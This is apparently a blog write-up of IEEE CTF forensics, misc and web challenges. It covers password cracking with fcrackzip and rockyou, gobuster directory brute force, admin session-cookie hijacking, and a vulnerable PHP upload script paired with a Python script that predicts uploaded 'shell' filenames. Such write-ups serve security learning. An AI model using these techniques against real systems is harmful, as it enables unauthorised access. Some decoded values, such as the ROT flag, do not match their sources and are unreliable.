---
title: IEEE CTF Challenges Writeup 
published: true
---

![logo](https://i.ibb.co/YPR3X9G/logo.png)

> **hello friends, this is My writeup for IEEE CTF Misc && RE && Forensics writeup**.

# []() Foreniscs

![easy](https://i.ibb.co/MsX3xL7/easy.png)

* this challenge was very easy, i checked it with binwalk and i found that there is hidden photo's, then i extracted them and with exiftool i got the flag.

> You can download the challenge from here [EASY](https://filebin.net/3z6ni0dvk2oj9rdn/EASY.dd?t=begirmoz).

* let's start with **binwalk**

> **binwalk EASY.dd**

![](https://i.ibb.co/XS7Hrwm/easy-binwalk.png)

* now we have 4 photos in this dd image, let's extract them now.

> **binwalk --dd='.*' EASY.dd**

* i got this file **_EASY.dd.extracted** let's open it now.

![](https://i.ibb.co/1mvcHbR/extracted.png)

> now we need to check all of them with **exiftool**

* exiftool * 

![](https://i.ibb.co/hmvppZq/comment.png)

* there is a Comment!

> **Comment                         : VRRR{Gu!f_vf_Gur_sy@t_T00q-W0o}**

* looks like a flag!, yes this is our flag but it's encrypted with **Rot** and you can decrypt it with this [website](https://www.dcode.fr/rot-cipher)

![](https://i.ibb.co/0tmLsbn/flag.png)

> **Flag: IEEE{THSISTHEFLGGDJB}**

# []() Misc Challenges

# []()1.Caesar salad

![](https://i.ibb.co/XtnxwQR/easy.png)

> **from the challenge name i thought that this a Caesat Cipher but it was, Rail Fence Cipher, i tried all the Ciphers in this website til i got the flag.**

* use this [website](https://cryptii.com/pipes/caesar-cipher) to decrypt the string.

![](https://i.ibb.co/fqxbJpq/flag1.png)

> **Flag: IEEE{CaesarAintH4rd}**

# []()2.Uns3cure

![](https://i.ibb.co/vYPJgGX/unsecure.png)

> we got a pcap file and i opened it with wireshark and it's so easy to find the plaintext password, you can download the file from [here](https://filebin.net/3z6ni0dvk2oj9rdn/unsecure.pcap?t=3muyooly)

* open wireshark and look carefully with me

![](https://i.ibb.co/x5QrKSB/packet.png)

> **in this packet we can see that there is someone tell anotherone to login with ssh to make something.**

![](https://i.ibb.co/gghRpbQ/flag.png)

> **in this packet we found a plaintext with the same name of the challenge and we can confirm that this is the right password from the next packet.**

![](https://i.ibb.co/9NhBs0Y/loggedin.png)

* Login successful!

> **Flag: IEEE{o_Uns3cure}**

# []()3.warm up

![](https://i.ibb.co/Gs7wTpX/warmup.png)

> **we hava base64 hash and when we decrypt it i got another md5 hash, but we need to fix the hash as mensioned in the description of the challenge.**

![](https://i.ibb.co/RC3vzM6/base64.png)

* after analyse this hash i optain that this a hex value from **a-f** so we need to delete the char **h** and **z** to get the right md5 hash

> **False md5 hash: 482c811dha5d5b4bc6d497ffa98491ze38**

> **Correct md5 hash: 482c811da5d5b4bc6d497ffa98491e38**

![](https://i.ibb.co/mD1VSgB/flagmd5.png)

> **Flag: IEEE{password123}**

# []()4.Brute Me

![](https://i.ibb.co/hLRVjM1/bruteme.png)

* You can download the file from [here](https://filebin.net/3z6ni0dvk2oj9rdn/flag.zip?t=55c8jhxy)

> i just cracked tha password and got the flag.

> **fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt flag.zip**

* **Password: sainsburys**

![](https://i.ibb.co/C7kzNYk/brute-flag.png)

> **Flag: IEEE{Easy_Brute}**

* nice!, we are done from the Misc now, let's go to the Web now.

# []() Web Challenges

# []()1. S3ssion master 

> **in this challenge we will play with the session cookie to get admin privilege to read the flag.**

![](https://i.ibb.co/Q8ZZzjm/sessionmaster.png)

* challenge [link](http://207.154.231.228:3000/)

* let's go

![](https://i.ibb.co/m0PDSwQ/suber.png)

* nothing here, so let's fireup burpsuite and see what we can do.

![](https://i.ibb.co/mHC5j6y/burp.png)

> i played with the session but i can't figure what is it and how can we got the admin cookie until i see hint for this challenge.

![](https://i.ibb.co/34bHvq3/hint.png)

* so now we know that we need to bruteforce hidden directory.

> **gobuster dir -u http://207.154.231.228:3000/ -w /usr/share/dirb/wordlists/common.txt -s 200,301**

```ruby

╭─xdev05@nic3One ~/Downloads/IEEE/writeup  
╰─➤  gobuster dir -u http://207.154.231.228:3000/ -w /usr/share/dirb/wordlists/common.txt -s 200,301
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://207.154.231.228:3000/
[+] Threads:        10
[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
[+] Status codes:   200,301,302
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 09:07:37 Starting gobuster
===============================================================
/sess (Status: 301)
===============================================================
2020/09/28 09:08:05 Finished
===============================================================

```

> **after opening this dir i noticed that, every chat for dir and the file in the latest dir are cookie, let's see.**

![](https://i.ibb.co/qnjZf9f/usercookie.png)

> **so the other dir will ne the session for the admin let's see.**

![](https://i.ibb.co/C85Trz0/admin.png)

> **if we compined the dirs and the name of the file in it we will optain the admin session.**

> **admin session: ry t2 w3 nd 2n xx on rd bq d7 qh 1o k71bzpev8zpa7vgnn24db4m4imvrhzo1zatw10iv**

* so this is the session : **ryt2w3nd2nxxonrdbqd7qh1ok71bzpev8zpa7vgnn24db4m4imvrhzo1zatw10iv**

* go to burp now and put it.

![](https://i.ibb.co/tsPFbgS/adminflag.png)

> **Flag: IEEE{wh0 473 my c00k13?} **

# []()2.S3cure uploader 

![](https://i.ibb.co/b34MSPJ/secure.png)

* **uploader.php**

```ruby

<?php
if(isset($_GET["upload"])) {
$target_dir = "uploads/";
$vars = explode(".", $_FILES["FileToUpload"]["name"]);
$filename=$vars[0];
$ext = $vars[1];
//randomizing file name
$time = date('Y-m-d H:i:s');
$new_name = md5(rand(1,1000).$time.$filename."0x4148fo").".".strtolower(pathinfo(basename($_FILES["FileToUpload"]["name"]),PATHINFO_EXTENSION));
$filename=explode(".", $_FILES["FileToUpload"]["name"])[0];
$ext = $filename=explode(".", $_FILES["FileToUpload"]["name"])[1];
$target_file = $target_dir . "$new_name";
// Check if file already exists
if (file_exists($target_file)) {
  echo "File already exists.";
  $uploadOk = 0;
  die();
}
// Check file size
if ($_FILES["FileToUpload"]["size"] > 500000) {
  echo "File is too large.";
  $uploadOk = 0;
  die();
}
$uploadOk = 1;
$check = getimagesize($_FILES["FileToUpload"]["tmp_name"]);
if($check !== false) {
    $uploadOk = 1;
} else {
    echo "File is not an image.";
    $uploadOk = 0;
    die();
  }
}
move_uploaded_file($_FILES["FileToUpload"]["tmp_name"], $target_file);
if(strtolower(pathinfo(basename($_FILES["FileToUpload"]["name"]),PATHINFO_EXTENSION))=="jpg"){
echo "File uploaded successfully to $target_file";
}
else{
	die("Invalid file type");
}
?>

```

* **hashs.py**

```ruby

#!/usr/bin/python
import os

import hashlib

date = "2020-09-27 21:25:01"
filename = "shell"
key = "0x4148fo"
print(key)
with open("final.txt", 'w') as f:
	for i in range(1,1001):
		string = str(str(i)+date+filename+key).encode('utf-8')
		hash = hashlib.md5(string).hexdigest()
		print('{}'.format(hash), file=f)

```

# []() S3cure uploader Walkthrough

[![Video](https://i.ibb.co/b34MSPJ/secure.png)](https://www.youtube.com/watch?v=ktoYt_myWBI&t=2s)

* Cheers!



